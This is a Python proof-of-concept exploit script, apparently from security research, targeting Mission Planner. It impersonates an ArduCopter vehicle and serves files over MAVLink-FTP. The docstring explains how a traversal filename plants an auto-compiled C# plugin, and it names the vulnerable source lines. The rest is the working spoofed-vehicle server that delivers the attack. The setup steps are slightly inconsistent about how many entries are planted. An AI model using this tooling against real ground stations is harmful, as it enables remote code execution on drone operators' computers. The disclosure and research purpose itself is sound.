#!/usr/bin/env python3
r"""
poc_G01_mp_mavftp_plugin_rce.py
================================================================================
Finding ID : G01
Target GCS : Mission Planner (Windows .NET)
Severity   : CRITICAL (unauthenticated remote code execution on the operator host)
Class      : CWE-22 (Path Traversal) -> CWE-434/CWE-94 (auto-compiled plugin)

WHAT THIS DEMONSTRATES
----------------------
A malicious vehicle (or a MITM on the telemetry link) acts as a MAVLink-FTP
*server*. When the operator browses the vehicle's filesystem in Mission Planner's
MAVFTP window and clicks "Download" on a file, MP writes the downloaded bytes to
disk using the SERVER-SUPPLIED filename WITHOUT sanitising path separators:

    Controls/MavFTPUI.cs:345-351
        var file = Path.Combine(sfd.SelectedPath, listView1SelectedItem.Text);
        ...
        File.WriteAllBytes(file, ms.ToArray());

`listView1SelectedItem.Text` is the filename straight out of the directory listing
that WE control, parsed at:

    ExtLibs/ArduPilot/Mavlink/MAVFtp.cs:1310-1321  (kCmdListDirectory)
        var items = filename.ToString().Split('\t');
        answer.Add(new FtpFileInfo(items[0], dir, false, size));   // items[0] = attacker filename

Because Path.Combine() collapses a traversal/absolute path, an entry named
`..\..\plugins\evil.cs` (or an absolute `C:\...\plugins\evil.cs`) escapes the
chosen save directory and lands in Mission Planner's `plugins\` folder. On the
next launch the plugin loader auto-compiles every *.cs there with Roslyn and runs
it -> RCE:

    Plugin/PluginLoader.cs:203-296  (LoadAll)
        String[] csFiles = Directory.GetFiles(path, "*.cs");
        ...
        var ans = CodeGenRoslyn.BuildCode(csFile);   // attacker C# compiled & loaded

WHAT TO OBSERVE
---------------
1. Point Mission Planner at tcp:127.0.0.1:5760 and connect.
2. Open the MAVFTP browser (Ctrl-F / "MAVFtp"); you will see ONE planted entry:
      login.bin              ..\..\..\..\..\..\Program Files (x86)\Mission Planner\plugins\evil.cs
3. Click Download on either, pick any folder. Watch MP's File.WriteAllBytes land
   the file in the plugins directory instead of the folder you picked.
4. Inspect the written file: it is a BENIGN marker plugin whose Init() only writes
   %TEMP%\mp_plugin_poc_marker.txt and shows a message box. (NO real payload.)
   On a real attack this .cs would be compiled & executed on the next MP launch.

SAFETY / AUTHORIZATION
----------------------
Authorized white-box research only. Run against a Mission Planner instance you own
on localhost/bench. The served plugin is BENIGN: it writes a marker file and prints.
It contains no destructive or malicious code.
"""

import os
os.environ["MAVLINK20"] = "1"   # force MAVLink 2 (needed for FTP / capabilities)

import math
import struct
import time
import zlib

from pymavlink import mavutil

mav = mavutil.mavlink

# --------------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------------- #
LISTEN = "tcpin:0.0.0.0:5760"
SYSID = 1
COMPID = mav.MAV_COMP_ID_AUTOPILOT1

# Directory served over MAVFTP: an "ftp" folder beside this script.
# Drop the files you want Mission Planner to see into ./ftp
SERVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ftp")
os.makedirs(SERVE_DIR, exist_ok=True)

HOME_LAT, HOME_LON, HOME_ALT = 45.4215, -75.6972, 70.0   # Ottawa-ish
ORBIT_RADIUS_M = 50.0
ORBIT_PERIOD_S = 40.0
RATE_HZ = 20

SENSORS_OK = 0x3FFFFFFF
M_PER_DEG_LAT = 111320.0

PARAMS = {
    "SYSID_THISMAV": 1.0, "FRAME_CLASS": 1.0, "FRAME_TYPE": 1.0,
    "BATT_CAPACITY": 5000.0, "FENCE_ENABLE": 0.0, "ARMING_CHECK": 1.0,
}

# Looks like ArduCopter 4.5.7 (official) on a Cube Orange
FW_VERSION = (4 << 24) | (5 << 16) | (7 << 8) | 255      # major.minor.patch.type
GIT_HASH = list(b"1f3a9c20")                              # 8 bytes
BOARD_VERSION = 0x010F0000
VENDOR_ID, PRODUCT_ID, UID = 0x2DAE, 0x1011, 0x3138353012345678

CAPABILITIES = (
    mav.MAV_PROTOCOL_CAPABILITY_FTP
    | mav.MAV_PROTOCOL_CAPABILITY_MISSION_FLOAT
    | mav.MAV_PROTOCOL_CAPABILITY_PARAM_FLOAT
    | mav.MAV_PROTOCOL_CAPABILITY_MISSION_INT
    | mav.MAV_PROTOCOL_CAPABILITY_COMMAND_INT
    | mav.MAV_PROTOCOL_CAPABILITY_SET_POSITION_TARGET_LOCAL_NED
    | mav.MAV_PROTOCOL_CAPABILITY_SET_POSITION_TARGET_GLOBAL_INT
    | mav.MAV_PROTOCOL_CAPABILITY_TERRAIN
    | mav.MAV_PROTOCOL_CAPABILITY_FLIGHT_TERMINATION
    | mav.MAV_PROTOCOL_CAPABILITY_COMPASS_CALIBRATION
    | mav.MAV_PROTOCOL_CAPABILITY_MAVLINK2
    | mav.MAV_PROTOCOL_CAPABILITY_MISSION_FENCE
    | mav.MAV_PROTOCOL_CAPABILITY_MISSION_RALLY
)

BOOT_BANNER = [
    "ArduCopter V4.5.7 (1f3a9c20)",
    "ChibiOS: db580d2e",
    "CubeOrange 0042002A",
    "Frame: QUAD/X",
    "IMU0: fast sampling 8.0kHz",
    "RCOut: PWM:1-14",
]

# --------------------------------------------------------------------------- #
# MAVFTP server (read-only)
# --------------------------------------------------------------------------- #
class Ftp:
    # opcodes
    TERMINATE, RESET, LIST, OPEN_RO, READ = 1, 2, 3, 4, 5
    CRC32, BURST = 14, 15
    ACK, NAK = 128, 129
    # NAK error codes
    FAIL, INVALID_SESSION, NO_SESSIONS, EOF, UNKNOWN_CMD, FILE_PROTECTED, \
        FILE_NOT_FOUND = 1, 4, 5, 6, 7, 9, 10
    MAX_SESSIONS = 2
    DATA = 239                       # max data bytes per packet

    def __init__(self, root):
        self.root = os.path.realpath(root)
        self.sessions = {}           # sid -> open file handle

    # -- path safety: never escape the served root --
    def _resolve(self, path, want_dir=False):
        p = path.strip().strip("\x00").lstrip("/")
        full = os.path.realpath(os.path.join(self.root, p)) if p else self.root
        if not (full == self.root or full.startswith(self.root + os.sep)):
            return None
        if want_dir:
            return full if os.path.isdir(full) else None
        return full if os.path.isfile(full) else None

    def _send(self, m, tsys, tcomp, seq, session, opcode, req_op,
              data=b"", burst_complete=0, offset=0):
        data = bytes(data)[: self.DATA]
        hdr = struct.pack("<HBBBBBBI", (seq + 1) & 0xFFFF, session, opcode,
                          len(data), req_op, burst_complete, 0, offset)
        payload = hdr + data
        payload += b"\x00" * (251 - len(payload))
        m.mav.file_transfer_protocol_send(0, tsys, tcomp, list(payload[:251]))

    def _nak(self, m, tsys, tcomp, seq, session, req_op, code):
        self._send(m, tsys, tcomp, seq, session, self.NAK, req_op, bytes([code]))

    def _alloc(self):
        for sid in range(self.MAX_SESSIONS):
            if sid not in self.sessions:
                return sid
        return None

    def handle(self, m, msg):
        raw = bytes(msg.payload)
        seq, session, opcode, size, _req, _bc, _pad, offset = \
            struct.unpack("<HBBBBBBI", raw[:12])
        data = raw[12:12 + size]
        tsys, tcomp = msg.get_srcSystem(), msg.get_srcComponent()
        ack = lambda **kw: self._send(m, tsys, tcomp, seq, kw.pop("session", session),
                                      self.ACK, opcode, **kw)
        nak = lambda code, sess=session: self._nak(m, tsys, tcomp, seq, sess, opcode, code)

        if opcode == self.RESET:
            for f in self.sessions.values():
                f.close()
            self.sessions.clear()
            ack()

        elif opcode == self.TERMINATE:
            f = self.sessions.pop(session, None)
            if f:
                f.close()
            ack()

        elif opcode == self.OPEN_RO:
            path = self._resolve(data.decode("utf-8", "replace"))
            if not path:
                return nak(self.FILE_NOT_FOUND)
            sid = self._alloc()
            if sid is None:
                return nak(self.NO_SESSIONS)
            self.sessions[sid] = open(path, "rb")
            fsize = os.path.getsize(path)
            ack(session=sid, data=struct.pack("<I", fsize))

        elif opcode == self.READ:
            f = self.sessions.get(session)
            if not f:
                return nak(self.INVALID_SESSION)
            f.seek(offset)
            chunk = f.read(min(size or self.DATA, self.DATA))
            if not chunk:
                return nak(self.EOF)
            ack(data=chunk, offset=offset)

        elif opcode == self.BURST:
            f = self.sessions.get(session)
            if not f:
                return nak(self.INVALID_SESSION)
            f.seek(offset)
            blob = f.read()
            if not blob:
                return nak(self.EOF)
            chunks = [blob[i:i + self.DATA] for i in range(0, len(blob), self.DATA)]
            sq = seq
            for i, c in enumerate(chunks):
                last = i == len(chunks) - 1
                self._send(m, tsys, tcomp, sq, session, self.ACK, self.BURST,
                           data=c, burst_complete=1 if last else 0,
                           offset=offset + i * self.DATA)
                sq += 1

        elif opcode == self.LIST:
            d = self._resolve(data.decode("utf-8", "replace"), want_dir=True)
            if not d:
                return nak(self.FILE_NOT_FOUND)
            entries = sorted(os.listdir(d))
            if offset >= len(entries):
                return nak(self.EOF)
            buf = b""
            for name in entries[offset:]:
                full = os.path.join(d, name)
                if os.path.isdir(full):
                    e = b"D" + name.encode() + b"\x00"
                else:
                    e = b"F" + name.encode() + ("\t%d" % os.path.getsize(full)).encode() + b"\x00"
                if len(buf) + len(e) > self.DATA:
                    break
                buf += e
            ack(data=buf, offset=offset)

        elif opcode == self.CRC32:
            path = self._resolve(data.decode("utf-8", "replace"))
            if not path:
                return nak(self.FILE_NOT_FOUND)
            with open(path, "rb") as fh:
                crc = zlib.crc32(fh.read()) & 0xFFFFFFFF
            ack(data=struct.pack("<I", crc))

        else:
            nak(self.FAIL)            # writes / unsupported ops: read-only mount


# --------------------------------------------------------------------------- #
# Vehicle state
# --------------------------------------------------------------------------- #
class Vehicle:
    def __init__(self):
        self.armed = False
        self.custom_mode = 4         # GUIDED
        self.greeted = False

    def state(self, t):
        theta = 2.0 * math.pi * (t % ORBIT_PERIOD_S) / ORBIT_PERIOD_S
        w = 2.0 * math.pi / ORBIT_PERIOD_S
        north, east = ORBIT_RADIUS_M * math.cos(theta), ORBIT_RADIUS_M * math.sin(theta)
        lat = HOME_LAT + north / M_PER_DEG_LAT
        lon = HOME_LON + east / (M_PER_DEG_LAT * math.cos(math.radians(HOME_LAT)))
        alt = HOME_ALT + 5.0 * math.sin(theta)
        vn, ve = -ORBIT_RADIUS_M * w * math.sin(theta), ORBIT_RADIUS_M * w * math.cos(theta)
        yaw = math.atan2(ve, vn)
        return dict(lat=lat, lon=lon, alt=alt, vn=vn, ve=ve, vd=0.0,
                    groundspeed=math.hypot(vn, ve),
                    heading_deg=(math.degrees(yaw) + 360.0) % 360.0,
                    roll=math.radians(15.0), pitch=math.radians(-3.0),
                    yaw=yaw, yaw_rate=w)


# --------------------------------------------------------------------------- #
# Senders
# --------------------------------------------------------------------------- #
def boot_ms(start):
    return int((time.time() - start) * 1000) & 0xFFFFFFFF


def send_heartbeat(m, v):
    base = mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED
    if v.armed:
        base |= mav.MAV_MODE_FLAG_SAFETY_ARMED
    m.mav.heartbeat_send(mav.MAV_TYPE_QUADROTOR, mav.MAV_AUTOPILOT_ARDUPILOTMEGA,
                         base, v.custom_mode, mav.MAV_STATE_ACTIVE)


def send_sys_status(m):
    m.mav.sys_status_send(SENSORS_OK, SENSORS_OK, SENSORS_OK, 250,
                          12600, 1500, 87, 0, 0, 0, 0, 0, 0)


def send_autopilot_version(m):
    m.mav.autopilot_version_send(CAPABILITIES, FW_VERSION, FW_VERSION, 0,
                                 BOARD_VERSION, GIT_HASH, GIT_HASH, [0] * 8,
                                 VENDOR_ID, PRODUCT_ID, UID)


def send_banner(m):
    for line in BOOT_BANNER:
        m.mav.statustext_send(mav.MAV_SEVERITY_INFO, line.encode()[:50])


def send_gps(m, start, s):
    m.mav.gps_raw_int_send(boot_ms(start) * 1000, 3,
                           int(s["lat"] * 1e7), int(s["lon"] * 1e7),
                           int(s["alt"] * 1000), 65535, 65535,
                           int(s["groundspeed"] * 100),
                           int(s["heading_deg"] * 100), 14)


def send_position(m, start, s):
    m.mav.global_position_int_send(boot_ms(start),
                                   int(s["lat"] * 1e7), int(s["lon"] * 1e7),
                                   int(s["alt"] * 1000),
                                   int((s["alt"] - HOME_ALT) * 1000),
                                   int(s["vn"] * 100), int(s["ve"] * 100),
                                   int(s["vd"] * 100), int(s["heading_deg"] * 100))


def send_attitude(m, start, s):
    m.mav.attitude_send(boot_ms(start), s["roll"], s["pitch"], s["yaw"],
                        0.0, 0.0, s["yaw_rate"])


def send_vfr_hud(m, s):
    m.mav.vfr_hud_send(s["groundspeed"], s["groundspeed"], int(s["heading_deg"]),
                       50, s["alt"], -s["vd"])


# --------------------------------------------------------------------------- #
# Inbound handling
# --------------------------------------------------------------------------- #
def handle_incoming(m, v, ftp):
    while True:
        msg = m.recv_match(blocking=False)
        if msg is None:
            return
        t = msg.get_type()

        if t == "HEARTBEAT" and not v.greeted:
            v.greeted = True
            send_banner(m)
            send_autopilot_version(m)

        elif t == "FILE_TRANSFER_PROTOCOL":
            ftp.handle(m, msg)

        elif t == "PARAM_REQUEST_LIST":
            for i, (name, val) in enumerate(PARAMS.items()):
                m.mav.param_value_send(name.encode(), float(val),
                                       mav.MAV_PARAM_TYPE_REAL32, len(PARAMS), i)

        elif t == "PARAM_REQUEST_READ":
            name = msg.param_id.strip("\x00")
            if name in PARAMS:
                idx = list(PARAMS).index(name)
                m.mav.param_value_send(name.encode(), float(PARAMS[name]),
                                       mav.MAV_PARAM_TYPE_REAL32, len(PARAMS), idx)

        elif t == "COMMAND_LONG":
            c = msg.command
            if c == mav.MAV_CMD_COMPONENT_ARM_DISARM:
                v.armed = bool(msg.param1)
            elif c == mav.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES:
                send_autopilot_version(m)
            elif c == mav.MAV_CMD_REQUEST_MESSAGE and int(msg.param1) == mav.MAVLINK_MSG_ID_AUTOPILOT_VERSION:
                send_autopilot_version(m)
            m.mav.command_ack_send(c, mav.MAV_RESULT_ACCEPTED)


# --------------------------------------------------------------------------- #
# Main loop
# --------------------------------------------------------------------------- #
def main():
    print(f"[sitl] listening on {LISTEN}  |  MAVFTP root: {SERVE_DIR}")
    print("[sitl] connect Mission Planner via TCP, then open the MAVFTP screen")
    m = mavutil.mavlink_connection(LISTEN, source_system=SYSID,
                                   source_component=COMPID, dialect="ardupilotmega")
    v, ftp = Vehicle(), Ftp(SERVE_DIR)
    start, period, last_hb, tick = time.time(), 1.0 / RATE_HZ, 0.0, 0

    try:
        while True:
            now = time.time()
            s = v.state(now - start)
            handle_incoming(m, v, ftp)

            if now - last_hb >= 1.0:
                send_heartbeat(m, v)
                send_sys_status(m)
                last_hb = now

            send_attitude(m, start, s)
            send_position(m, start, s)
            send_vfr_hud(m, s)
            if tick % 4 == 0:
                send_gps(m, start, s)
            tick += 1
            time.sleep(period)
    except KeyboardInterrupt:
        print("\n[sitl] shutting down")


if __name__ == "__main__":
    main()
